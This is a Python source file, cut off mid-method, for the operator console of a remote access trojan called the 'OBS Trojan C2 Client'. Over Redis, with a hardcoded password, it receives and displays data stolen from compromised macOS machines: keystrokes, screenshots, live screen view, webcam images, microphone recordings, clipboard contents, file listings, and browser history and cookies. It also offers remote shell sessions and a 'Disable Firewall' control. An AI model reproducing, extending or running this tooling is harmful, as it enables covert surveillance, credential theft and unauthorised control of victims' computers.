#!/usr/bin/env python3
"""
Windows Redis C2 Client for OBS Trojan
Receives and displays data from macOS payload clients
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import redis
import json
import base64
import threading
import time
import uuid
from datetime import datetime
from PIL import Image, ImageTk
import io
import os
import wave
import pygame
import asyncio
import websockets
import socket

class OBSTrojanClient:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("OBS Trojan C2 Client")
        self.root.geometry("1200x800")
        
        # Redis connection
        self.redis_client = None
        self.connected = False
        self.monitoring = False
        
        # Data storage
        self.clients = {}
        self.current_client = None
        
        # PTY session management
        self.pty_sessions = {}
        self.current_session = None
        
        # WebSocket server for real-time PTY
        self.ws_server = None
        self.ws_clients = {}
        self.ws_port = 8080
        
        # Initialize pygame for audio playback
        pygame.mixer.init()
        
        self.setup_ui()
        self.setup_redis_connection()
        self.start_websocket_server()
        
    def setup_ui(self):
        """Setup the main UI"""
        # Main frame
        main_frame = ttk.Frame(self.root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Connection frame
        conn_frame = ttk.LabelFrame(main_frame, text="Redis Connection")
        conn_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(conn_frame, text="Host:").grid(row=0, column=0, padx=5, pady=5)
        self.host_entry = ttk.Entry(conn_frame, width=20)
        self.host_entry.insert(0, "ip here")
        self.host_entry.grid(row=0, column=1, padx=5, pady=5)
        
        ttk.Label(conn_frame, text="Port:").grid(row=0, column=2, padx=5, pady=5)
        self.port_entry = ttk.Entry(conn_frame, width=10)
        self.port_entry.insert(0, "6379")
        self.port_entry.grid(row=0, column=3, padx=5, pady=5)
        
        ttk.Label(conn_frame, text="Password:").grid(row=0, column=4, padx=5, pady=5)
        self.password_entry = ttk.Entry(conn_frame, width=20, show="*")
        self.password_entry.insert(0, "OBSTrojan2024!SecureC2")
        self.password_entry.grid(row=0, column=5, padx=5, pady=5)
        
        self.connect_btn = ttk.Button(conn_frame, text="Connect", command=self.connect_redis)
        self.connect_btn.grid(row=0, column=6, padx=5, pady=5)
        
        self.status_label = ttk.Label(conn_frame, text="Disconnected", foreground="red")
        self.status_label.grid(row=0, column=7, padx=5, pady=5)
        
        # Client selection frame
        client_frame = ttk.LabelFrame(main_frame, text="Connected Clients")
        client_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.client_listbox = tk.Listbox(client_frame, height=3)
        self.client_listbox.pack(fill=tk.X, padx=5, pady=5)
        self.client_listbox.bind('<<ListboxSelect>>', self.on_client_select)
        
        # Notebook for different data types
        self.notebook = ttk.Notebook(main_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True)
        
        # Screenshots tab
        self.setup_screenshot_tab()
        
        # Clipboard tab
        self.setup_clipboard_tab()
        
        # Files tab
        self.setup_files_tab()
        
        # Camera tab
        self.setup_camera_tab()
        
        # Microphone tab
        self.setup_microphone_tab()
        
        # Keylogger tab
        self.setup_keylogger_tab()
        
        # Browser data tab
        self.setup_browser_tab()
        
        # Screen sharing tab
        self.setup_screenshare_tab()
        
        # Terminal tab
        self.setup_terminal_tab()
        
        # Control buttons
        control_frame = ttk.Frame(main_frame)
        control_frame.pack(fill=tk.X, pady=(10, 0))
        
        self.start_btn = ttk.Button(control_frame, text="Start Monitoring", command=self.start_monitoring)
        self.start_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        self.stop_btn = ttk.Button(control_frame, text="Stop Monitoring", command=self.stop_monitoring, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        self.clear_btn = ttk.Button(control_frame, text="Clear All Data", command=self.clear_data)
        self.clear_btn.pack(side=tk.LEFT, padx=(0, 5))
        
    def setup_screenshot_tab(self):
        """Setup screenshots tab"""
        screen_frame = ttk.Frame(self.notebook)
        self.notebook.add(screen_frame, text="Screenshots")
        
        # Screenshot display
        self.screenshot_label = ttk.Label(screen_frame, text="No screenshots available")
        self.screenshot_label.pack(pady=20)
        
        # Screenshot controls
        controls = ttk.Frame(screen_frame)
        controls.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Button(controls, text="Save Screenshot", command=self.save_screenshot).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(controls, text="Refresh", command=self.refresh_screenshot).pack(side=tk.LEFT)
        
        # Screenshot info
        self.screenshot_info = ttk.Label(screen_frame, text="")
        self.screenshot_info.pack(pady=5)
        
    def setup_clipboard_tab(self):
        """Setup clipboard tab"""
        clip_frame = ttk.Frame(self.notebook)
        self.notebook.add(clip_frame, text="Clipboard")
        
        # Clipboard text display
        self.clipboard_text = scrolledtext.ScrolledText(clip_frame, height=20)
        self.clipboard_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Clipboard controls
        controls = ttk.Frame(clip_frame)
        controls.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Button(controls, text="Clear", command=lambda: self.clipboard_text.delete(1.0, tk.END)).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(controls, text="Save to File", command=self.save_clipboard).pack(side=tk.LEFT)
        
    def setup_files_tab(self):
        """Setup files tab"""
        files_frame = ttk.Frame(self.notebook)
        self.notebook.add(files_frame, text="Files")
        
        # File tree
        self.file_tree = ttk.Treeview(files_frame, columns=('Size', 'Modified', 'Type'), show='tree headings')
        self.file_tree.heading('#0', text='Path')
        self.file_tree.heading('Size', text='Size')
        self.file_tree.heading('Modified', text='Modified')
        self.file_tree.heading('Type', text='Type')
        
        # Scrollbar for tree
        tree_scroll = ttk.Scrollbar(files_frame, orient=tk.VERTICAL, command=self.file_tree.yview)
        self.file_tree.configure(yscrollcommand=tree_scroll.set)
        
        self.file_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(10, 0), pady=10)
        tree_scroll.pack(side=tk.RIGHT, fill=tk.Y, padx=(0, 10), pady=10)
        
        # File controls
        file_controls = ttk.Frame(files_frame)
        file_controls.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Button(file_controls, text="Download Selected", command=self.download_file).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(file_controls, text="Refresh", command=self.refresh_files).pack(side=tk.LEFT)
        
    def setup_camera_tab(self):
        """Setup camera tab"""
        camera_frame = ttk.Frame(self.notebook)
        self.notebook.add(camera_frame, text="Camera")
        
        # Camera display
        self.camera_label = ttk.Label(camera_frame, text="No camera data available")
        self.camera_label.pack(pady=20)
        
        # Camera controls
        controls = ttk.Frame(camera_frame)
        controls.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Button(controls, text="Save Image", command=self.save_camera).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(controls, text="Refresh", command=self.refresh_camera).pack(side=tk.LEFT)
        
    def setup_microphone_tab(self):
        """Setup microphone tab"""
        mic_frame = ttk.Frame(self.notebook)
        self.notebook.add(mic_frame, text="Microphone")
        
        # Audio controls
        controls = ttk.Frame(mic_frame)
        controls.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Button(controls, text="Play Latest", command=self.play_audio).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(controls, text="Save Audio", command=self.save_audio).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(controls, text="Refresh", command=self.refresh_audio).pack(side=tk.LEFT)
        
        # Audio info
        self.audio_info = scrolledtext.ScrolledText(mic_frame, height=15)
        self.audio_info.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
    
    def setup_keylogger_tab(self):
        """Setup keylogger tab"""
        keylog_frame = ttk.Frame(self.notebook)
        self.notebook.add(keylog_frame, text="Keylogger")
        
        # Keylogger controls
        controls = ttk.Frame(keylog_frame)
        controls.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Button(controls, text="Clear", command=self.clear_keylog).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(controls, text="Save to File", command=self.save_keylog).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(controls, text="Search", command=self.search_keylog).pack(side=tk.LEFT)
        
        # Search frame
        search_frame = ttk.Frame(keylog_frame)
        search_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(search_frame, text="Search:").pack(side=tk.LEFT, padx=(0, 5))
        self.keylog_search = ttk.Entry(search_frame, width=30)
        self.keylog_search.pack(side=tk.LEFT, padx=(0, 5))
        self.keylog_search.bind('<Return>', self.search_keylog)
        
        # Keylogger output
        self.keylog_text = scrolledtext.ScrolledText(
            keylog_frame, 
            height=20, 
            font=("Consolas", 9),
            bg="black",
            fg="lime"
        )
        self.keylog_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Keylog stats
        self.keylog_stats = ttk.Label(keylog_frame, text="No keylog data")
        self.keylog_stats.pack(fill=tk.X, padx=10, pady=(0, 10))
    
    def setup_browser_tab(self):
        """Setup browser data tab"""
        browser_frame = ttk.Frame(self.notebook)
        self.notebook.add(browser_frame, text="Browser Data")
        
        # Browser controls
        controls = ttk.Frame(browser_frame)
        controls.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Button(controls, text="Refresh", command=self.refresh_browser).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(controls, text="Export All", command=self.export_browser_data).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(controls, text="Clear", command=self.clear_browser).pack(side=tk.LEFT)
        
        # Browser data notebook
        self.browser_notebook = ttk.Notebook(browser_frame)
        self.browser_notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # History tab
        history_frame = ttk.Frame(self.browser_notebook)
        self.browser_notebook.add(history_frame, text="History")
        self.browser_history = scrolledtext.ScrolledText(history_frame, height=15, font=("Consolas", 9))
        self.browser_history.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Bookmarks tab
        bookmarks_frame = ttk.Frame(self.browser_notebook)
        self.browser_notebook.add(bookmarks_frame, text="Bookmarks")
        self.browser_bookmarks = scrolledtext.ScrolledText(bookmarks_frame, height=15, font=("Consolas", 9))
        self.browser_bookmarks.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Cookies tab
        cookies_frame = ttk.Frame(self.browser_notebook)
        self.browser_notebook.add(cookies_frame, text="Cookies")
        self.browser_cookies = scrolledtext.ScrolledText(cookies_frame, height=15, font=("Consolas", 9))
        self.browser_cookies.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Browser stats
        self.browser_stats = ttk.Label(browser_frame, text="No browser data")
        self.browser_stats.pack(fill=tk.X, padx=10, pady=(0, 10))
    
    def setup_screenshare_tab(self):
        """Setup live screen sharing tab"""
        share_frame = ttk.Frame(self.notebook)
        self.notebook.add(share_frame, text="Live Screen")
        
        # Screen sharing controls
        controls = ttk.Frame(share_frame)
        controls.pack(fill=tk.X, padx=10, pady=10)
        
        self.screenshare_btn = ttk.Button(controls, text="Start Live View", command=self.toggle_screenshare)
        self.screenshare_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(controls, text="Save Frame", command=self.save_screenshare_frame).pack(side=tk.LEFT, padx=(0, 5))
        
        # Quality control
        ttk.Label(controls, text="Quality:").pack(side=tk.LEFT, padx=(10, 5))
        self.quality_var = tk.StringVar(value="Medium")
        quality_combo = ttk.Combobox(controls, textvariable=self.quality_var, values=["Low", "Medium", "High"], width=10)
        quality_combo.pack(side=tk.LEFT, padx=(0, 5))
        
        # Screen sharing display
        self.screenshare_label = ttk.Label(share_frame, text="Click 'Start Live View' to begin")
        self.screenshare_label.pack(pady=20)
        
        # Screen sharing info
        self.screenshare_info = ttk.Label(share_frame, text="")
        self.screenshare_info.pack(pady=5)
        
        # Live view state
        self.screenshare_active = False
        
    def setup_terminal_tab(self):
        """Setup enhanced PTY terminal tab"""
        terminal_frame = ttk.Frame(self.notebook)
        self.notebook.add(terminal_frame, text="Terminal")
        
        # Session management frame
        session_frame = ttk.Frame(terminal_frame)
        session_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(session_frame, text="Session:").pack(side=tk.LEFT, padx=(0, 5))
        self.session_combo = ttk.Combobox(session_frame, width=20, state="readonly")
        self.session_combo.pack(side=tk.LEFT, padx=(0, 5))
        self.session_combo.bind('<<ComboboxSelected>>', self.on_session_select)
        
        ttk.Button(session_frame, text="New Shell", command=self.create_pty_session).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(session_frame, text="Close Session", command=self.close_pty_session).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(session_frame, text="Disable Firewall", command=self.disable_firewall).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(session_frame, text="Clear", command=self.clear_terminal).pack(side=tk.LEFT)
        
        # Terminal output with PTY support
        self.terminal_output = scrolledtext.ScrolledText(
            terminal_frame, 
            height=20, 
            bg="black", 
            fg="green", 
            font=("Consolas", 10),
            wrap=tk.NONE
        )
        self.terminal_output.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Command input frame
        input_frame = ttk.Frame(terminal_frame)
        input_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.command_entry = ttk.Entry(input_frame, font=("Consolas", 10))
        self.command_entry.pack(fill=tk.X, padx=(0, 5))
        self.command_entry.bind('<Return>', self.send_pty_input)
        self.command_entry.bind('<Up>', self.history_up)
        self.command_entry.bind('<Down>', self.history_down)
        self.command_entry.bind('<Control-c>', self.send_interrupt)
        
        # Terminal status
        self.terminal_status = ttk.Label(terminal_frame, text="No active session")
        self.terminal_status.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        # Command history
        self.command_history = []
        self.history_index = -1
        
    def setup_redis_connection(self):
        """Setup Redis connection"""
        try:
            password = self.password_entry.get() if self.password_entry.get() else None
            self.redis_client = redis.Redis(
                host=self.host_entry.get(),
                port=int(self.port_entry.get()),
                password=password,
                decode_responses=True
            )
            # Test connection
            self.redis_client.ping()
            self.connected = True
            self.status_label.config(text="Connected", foreground="green")
            self.connect_btn.config(text="Disconnect")
        except Exception as e:
            messagebox.showerror("Connection Error", f"Failed to connect to Redis: {str(e)}")
            
    def connect_redis(self):
        """Connect/disconnect Redis"""
        if self.connected:
            self.disconnect_redis()
        else:
            self.setup_redis_connection()
            
    def disconnect_redis(self):
        """Disconnect from Redis"""
        self.connected = False
        self.monitoring = False
        self.redis_client = None
        self.status_label.config(text="Disconnected", foreground="red")
        self.connect_btn.config(text="Connect")
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        
    def start_monitoring(self):
        """Start monitoring Redis channels"""
        if not self.connected:
            messagebox.showerror("Error", "Not connected to Redis")
            return
            
        self.monitoring = True
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        
        # Start monitoring threads
        threading.Thread(target=self.monitor_channel, args=("screen_data",), daemon=True).start()
        threading.Thread(target=self.monitor_channel, args=("clipboard_data",), daemon=True).start()
        threading.Thread(target=self.monitor_channel, args=("file_data",), daemon=True).start()
        threading.Thread(target=self.monitor_channel, args=("camera_data",), daemon=True).start()
        threading.Thread(target=self.monitor_channel, args=("mic_data",), daemon=True).start()
        threading.Thread(target=self.monitor_channel, args=("keylog_data",), daemon=True).start()
        threading.Thread(target=self.monitor_channel, args=("browser_data",), daemon=True).start()
        threading.Thread(target=self.monitor_channel, args=("screenshare_data",), daemon=True).start()
        threading.Thread(target=self.monitor_channel, args=("response_data",), daemon=True).start()
        
    def stop_monitoring(self):
        """Stop monitoring"""
        self.monitoring = False
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        
    def monitor_channel(self, channel):
        """Monitor a specific Redis channel"""
        while self.monitoring and self.connected:
            try:
                data = self.redis_client.brpop(channel, timeout=1)
                if data:
                    self.process_data(channel, data[1])
            except Exception as e:
                print(f"Error monitoring {channel}: {e}")
                time.sleep(1)
                
    def process_data(self, channel, raw_data):
        """Process incoming data"""
        try:
            # Skip empty or invalid data
            if not raw_data or raw_data.strip() == "":
                return
                
            data = json.loads(raw_data)
            client_id = data.get('client_id', 'unknown')
            
            # Add client if new
            if client_id not in self.clients:
                self.clients[client_id] = {
                    'screenshots': [],
                    'clipboard': [],
                    'files': [],
                    'camera': [],
                    'microphone': [],
                    'keystrokes': [],
                    'browser_data': [],
                    'screenshare': []
                }
                self.root.after(0, self.update_client_list)
            
            # Store data by type
            data_type = data.get('type', 'unknown')
            if data_type == 'screenshot':
                self.clients[client_id]['screenshots'].append(data)
                if client_id == self.current_client:
                    self.root.after(0, self.update_screenshot_display)
            elif data_type == 'clipboard':
                self.clients[client_id]['clipboard'].append(data)
                if client_id == self.current_client:
                    self.root.after(0, self.update_clipboard_display)
            elif data_type == 'file_info':
                self.clients[client_id]['files'].append(data)
                if client_id == self.current_client:
                    self.root.after(0, self.update_files_display)
            elif data_type == 'camera':
                self.clients[client_id]['camera'].append(data)
                if client_id == self.current_client:
                    self.root.after(0, self.update_camera_display)
            elif data_type == 'microphone':
                self.clients[client_id]['microphone'].append(data)
                if client_id == self.current_client:
                    self.root.after(0, self.update_microphone_display)
            elif data_type == 'keystrokes':
                self.clients[client_id]['keystrokes'].append(data)
                if client_id == self.current_client:
                    self.root.after(0, self.update_keylog_display)
            elif data_type == 'browser_data':
                self.clients[client_id]['browser_data'].append(data)
                if client_id == self.current_client:
                    self.root.after(0, self.update_browser_display)
            elif data_type == 'screenshare':
                self.clients[client_id]['screenshare'].append(data)
                if client_id == self.current_client and self.screenshare_active:
                    self.root.after(0, self.update_screenshare_display)
            elif data_type == 'command_response':
                # Handle legacy command responses
                if client_id == self.current_client:
                    self.root.after(0, lambda: self.handle_command_response(data))
            elif data_type == 'pty_created':
                # Handle new PTY session creation
                if client_id == self.current_client:
                    self.root.after(0, lambda: self.handle_pty_created(data))
            elif data_type == 'pty_output':
                # Handle PTY output
                if client_id == self.current_client:
                    self.root.after(0, lambda: self.handle_pty_output(data))
                    
        except json.JSONDecodeError as e:
            print(f"JSON decode error: {e}")
            print(f"Raw data: {raw_data[:100]}...")
        except Exception as e:
            print(f"Error processing data: {e}")
            print(f"Raw data type: {type(raw_data)}, length: {len(raw_data) if raw_data else 0}")
            
    def update_client_list(self):
        """Update client listbox"""
        self.client_listbox.delete(0, tk.END)
        for client_id in self.clients.keys():
            self.client_listbox.insert(tk.END, client_id)
            
    def on_client_select(self, event):
        """Handle client selection"""
        selection = self.client_listbox.curselection()
        if selection:
            self.current_client = self.client_listbox.get(selection[0])
            self.update_all_displays()
            
    def update_all_displays(self):
        """Update all display tabs"""
        self.update_screenshot_display()
        self.update_clipboard_display()
        self.update_files_display()
        self.update_camera_display()
        self.update_microphone_display()
        self.update_keylog_display()
        self.update_browser_display()
        self.update_screenshare_display()
        
    def update_screenshot_display(self):
        """Update screenshot display"""
        if not self.current_client or not self.clients[self.current_client]['screenshots']:
            return
            
        latest = self.clients[self.current_client]['screenshots'][-1]
        try:
            image_data = base64.b64decode(latest['data'])
            image = Image.open(io.BytesIO(image_data))
            
            # Resize for display
            image.thumbnail((800, 600), Image.Resampling.LANCZOS)
            photo = ImageTk.PhotoImage(image)
            
            self.screenshot_label.config(image=photo, text="")
            self.screenshot_label.image = photo  # Keep a reference
            
            # Update info
            timestamp = latest['timestamp']
            metadata = latest.get('metadata', {})
            info = f"Captured: {timestamp} | Size: {metadata.get('width', 'N/A')}x{metadata.get('height', 'N/A')}"
            self.screenshot_info.config(text=info)
            
        except Exception as e:
            print(f"Error displaying screenshot: {e}")
            
    def update_clipboard_display(self):
        """Update clipboard display"""
        if not self.current_client:
            return
            
        clipboard_data = self.clients[self.current_client]['clipboard']
        
        # Clear and update
        self.clipboard_text.delete(1.0, tk.END)
        for entry in clipboard_data[-20:]:  # Show last 20 entries
            timestamp = entry['timestamp']
            data = entry['data']
            self.clipboard_text.insert(tk.END, f"[{timestamp}]\n{data}\n\n")
            
    def update_files_display(self):
        """Update files display"""
        if not self.current_client:
            return
            
        # Clear tree
        for item in self.file_tree.get_children():
            self.file_tree.delete(item)
            
        # Add files
        files_data = self.clients[self.current_client]['files']
        for entry in files_data:
            try:
                # Handle different data formats
                if isinstance(entry.get('data'), str):
                    # Our payload sends file list as string
                    file_lines = entry['data'].split('\n')
                    for line in file_lines:
                        if line.strip():
                            # Parse format: "Directory/filename (size bytes, date)"
                            parts = line.split(' (')
                            if len(parts) >= 2:
                                path = parts[0]
                                size_info = parts[1].split(' bytes')[0] if 'bytes' in parts[1] else "0"
                                date_info = parts[1].split(', ')[-1].rstrip(')') if ', ' in parts[1] else "Unknown"
                                
                                self.file_tree.insert('', tk.END, text=path, values=(size_info, date_info, "File"))
                else:
                    # Legacy format
                    file_info = json.loads(entry['data'])
                    path = file_info['path']
                    size = file_info['size']
                    mod_time = file_info['mod_time']
                    is_dir = file_info['is_dir']
                    
                    file_type = "Directory" if is_dir else "File"
                    size_str = str(size) if not is_dir else ""
                    
                    self.file_tree.insert('', tk.END, text=path, values=(size_str, mod_time, file_type))
            except Exception as e:
                print(f"Error adding file to tree: {e}")
                # Add raw data for debugging
                if entry.get('data'):
                    self.file_tree.insert('', tk.END, text=f"Raw: {entry['data'][:50]}...", values=("", "", "Debug"))
                
    def update_camera_display(self):
        """Update camera display"""
        if not self.current_client or not self.clients[self.current_client]['camera']:
            return
            
        latest = self.clients[self.current_client]['camera'][-1]
        try:
            image_data = base64.b64decode(latest['data'])
            image = Image.open(io.BytesIO(image_data))
            
            # Resize for display
            image.thumbnail((400, 300), Image.Resampling.LANCZOS)
            photo = ImageTk.PhotoImage(image)
            
            self.camera_label.config(image=photo, text="")
            self.camera_label.image = photo  # Keep a reference
            
        except Exception as e:
            print(f"Error displaying camera image: {e}")
            
    def update_microphone_display(self):
        """Update microphone display"""
        if not self.current_client:
            return
            
        mic_data = self.clients[self.current_client]['microphone']
        
        # Clear and update
        self.audio_info.delete(1.0, tk.END)
        for entry in mic_data[-10:]:  # Show last 10 entries
            timestamp = entry['timestamp']
            metadata = entry.get('metadata', {})
            duration = metadata.get('duration', 'N/A')
            format_type = metadata.get('format', 'N/A')
            
            self.audio_info.insert(tk.END, f"[{timestamp}] Duration: {duration}s, Format: {format_type}\n")
            
    def save_screenshot(self):
        """Save current screenshot"""
        if not self.current_client or not self.clients[self.current_client]['screenshots']:
            messagebox.showwarning("Warning", "No screenshot to save")
            return
            
        latest = self.clients[self.current_client]['screenshots'][-1]
        try:
            image_data = base64.b64decode(latest['data'])
            filename = f"screenshot_{self.current_client}_{int(time.time())}.png"
            
            with open(filename, 'wb') as f:
                f.write(image_data)
                
            messagebox.showinfo("Success", f"Screenshot saved as {filename}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save screenshot: {e}")
            
    def save_clipboard(self):
        """Save clipboard data"""
        if not self.current_client:
            messagebox.showwarning("Warning", "No client selected")
            return
            
        filename = f"clipboard_{self.current_client}_{int(time.time())}.txt"
        try:
            with open(filename, 'w') as f:
                f.write(self.clipboard_text.get(1.0, tk.END))
            messagebox.showinfo("Success", f"Clipboard data saved as {filename}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save clipboard: {e}")
            
    def download_file(self):
        """Download selected file"""
        selection = self.file_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "No file selected")
            return
            
        # This would implement file download functionality
        messagebox.showinfo("Info", "File download functionality would be implemented here")
        
    def save_camera(self):
        """Save camera image"""
        if not self.current_client or not self.clients[self.current_client]['camera']:
            messagebox.showwarning("Warning", "No camera image to save")
            return
            
        latest = self.clients[self.current_client]['camera'][-1]
        try:
            image_data = base64.b64decode(latest['data'])
            filename = f"camera_{self.current_client}_{int(time.time())}.jpg"
            
            with open(filename, 'wb') as f:
                f.write(image_data)
                
            messagebox.showinfo("Success", f"Camera image saved as {filename}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save camera image: {e}")
            
    def play_audio(self):
        """Play latest audio"""
        if not self.current_client or not self.clients[self.current_client]['microphone']:
            messagebox.showwarning("Warning", "No audio to play")
            return
            
        latest = self.clients[self.current_client]['microphone'][-1]
        try:
            audio_data = base64.b64decode(latest['data'])
            filename = f"temp_audio_{int(time.time())}.wav"
            
            with open(filename, 'wb') as f:
                f.write(audio_data)
                
            pygame.mixer.music.load(filename)
            pygame.mixer.music.play()
            
            # Clean up temp file after a delay
            self.root.after(15000, lambda: os.remove(filename) if os.path.exists(filename) else None)
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to play audio: {e}")
            
    def save_audio(self):
        """Save audio file"""
        if not self.current_client or not self.clients[self.current_client]['microphone']:
            messagebox.showwarning("Warning", "No audio to save")
            return
            
        latest = self.clients[self.current_client]['microphone'][-1]
        try:
            audio_data = base64.b64decode(latest['data'])
            filename = f"audio_{self.current_client}_{int(time.time())}.wav"
            
            with open(filename, 'wb') as f:
                f.write(audio_data)
                
            messagebox.showinfo("Success", f"Audio saved as {filename}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save audio: {e}")
            
    def refresh_screenshot(self):
        """Refresh screenshot display"""
        self.update_screenshot_display()
        
    def refresh_files(self):
        """Refresh files display"""
        self.update_files_display()
        
    def refresh_camera(self):
        """Refresh camera display"""
        self.update_camera_display()
        
    def refresh_audio(self):
        """Refresh audio display"""
        self.update_microphone_display()
    
    def update_keylog_display(self):
        """Update keylogger display"""
        if not self.current_client:
            return
            
        keylog_data = self.clients[self.current_client]['keystrokes']
        
        # Clear and update
        self.keylog_text.delete(1.0, tk.END)
        total_chars = 0
        
        for entry in keylog_data[-50:]:  # Show last 50 entries
            timestamp = entry['timestamp']
            data = entry['data']
            metadata = entry.get('metadata', {})
            active_app = metadata.get('active_app', 'Unknown')
            
            self.keylog_text.insert(tk.END, f"[{timestamp}] App: {active_app}\n")
            self.keylog_text.insert(tk.END, f"{data}\n\n")
            total_chars += len(data)
            
        # Update stats
        self.keylog_stats.config(text=f"Total entries: {len(keylog_data)}, Characters: {total_chars}")
        self.keylog_text.see(tk.END)
    
    def update_browser_display(self):
        """Update browser data display"""
        if not self.current_client:
            return
            
        browser_data = self.clients[self.current_client]['browser_data']
        if not browser_data:
            return
            
        latest = browser_data[-1]
        try:
            decoded_data = base64.b64decode(latest['data']).decode('utf-8')
            
            # Clear all browser tabs
            self.browser_history.delete(1.0, tk.END)
            self.browser_bookmarks.delete(1.0, tk.END)
            self.browser_cookies.delete(1.0, tk.END)
            
            # Parse and display different sections
            sections = decoded_data.split('===')
            for section in sections:
                if 'HISTORY' in section:
                    self.browser_history.insert(tk.END, section)
                elif 'BOOKMARKS' in section:
                    self.browser_bookmarks.insert(tk.END, section)
                elif 'COOKIES' in section:
                    self.browser_cookies.insert(tk.END, section)
            
            # Update stats
            metadata = latest.get('metadata', {})
            browsers = metadata.get('browsers', [])
            data_types = metadata.get('data_types', [])
            self.browser_stats.config(text=f"Browsers: {', '.join(browsers)}, Data: {', '.join(data_types)}")
            
        except Exception as e:
            print(f"Error displaying browser data: {e}")
    
    def update_screenshare_display(self):
        """Update live screen sharing display"""
        if not self.current_client or not self.clients[self.current_client]['screenshare']:
            return
            
        latest = self.clients[self.current_client]['screenshare'][-1]
        try:
            image_data = base64.b64decode(latest['data'])
            image = Image.open(io.BytesIO(image_data))
            
            # Resize for display
            image.thumbnail((800, 600), Image.Resampling.LANCZOS)
            photo = ImageTk.PhotoImage(image)
            
            self.screenshare_label.config(image=photo, text="")
            self.screenshare_label.image = photo  # Keep a reference
            
            # Update info
            timestamp = latest['timestamp']
            metadata = latest.get('metadata', {})
            active_app = metadata.get('active_app', 'Unknown')
            size = metadata.get('size', 0)
            
            self.screenshare_info.config(text=f"Live: {timestamp} | App: {active_app} | Size: {size} bytes")
            
        except Exception as e:
            print(f"Error displaying screenshare: {e}")
    
    def clear_keylog(self):
        """Clear keylogger display"""
        self.keylog_text.delete(1.0, tk.END)
        if self.current_client and self.current_client in self.clients:
            self.clients[self.current_client]['keystrokes'] = []
        self.keylog_stats.config(text="Keylog cleared")
    
    def save_keylog(self):
        """Save keylogger data"""
        if not self.current_client:
            messagebox.showwarning("Warning", "No client selected")
            return
            
        filename = f"keylog_{self.current_client}_{int(time.time())}.txt"
        try:
            with open(filename, 'w') as f:
                f.write(self.keylog_text.get(1.0, tk.END))
            messagebox.showinfo("Success", f"Keylog saved as {filename}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save keylog: {e}")
    
    def search_keylog(self, event=None):
        """Search in keylog data"""
        search_term = self.keylog_search.get()
        if not search_term:
            return
            
        # Simple search implementation
        content = self.keylog_text.get(1.0, tk.END)
        if search_term.lower() in content.lower():
            messagebox.showinfo("Search", f"Found '{search_term}' in keylog data")
        else:
            messagebox.showinfo("Search", f"'{search_term}' not found")
    
    def refresh_browser(self):
        """Refresh browser data display"""
        self.update_browser_display()
    
    def export_browser_data(self):
        """Export all browser data"""
        if not self.current_client:
            messagebox.showwarning("Warning", "No client selected")
            return
            
        filename = f"browser_data_{self.current_client}_{int(time.time())}.txt"
        try:
            with open(filename, 'w') as f:
                f.write("=== BROWSER HISTORY ===\n")
                f.write(self.browser_history.get(1.0, tk.END))
                f.write("\n=== BROWSER BOOKMARKS ===\n")
                f.write(self.browser_bookmarks.get(1.0, tk.END))
                f.write("\n=== BROWSER COOKIES ===\n")
                f.write(self.browser_cookies.get(1.0, tk.END))
            messagebox.showinfo("Success", f"Browser data exported as {filename}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to export browser data: {e}")
    
    def clear_browser(self):
        """Clear browser data display"""
        self.browser_history.delete(1.0, tk.END)
        self.browser_bookmarks.delete(1.0, tk.END)
        self.browser_cookies.delete(1.0, tk.END)
        if self.current_client and self.current_client in self.clients:
            self.clients[self.current_client]['browser_data'] = []
        self.browser_stats.config(text="Browser data cleared")
    
    def toggle_screenshare(self):
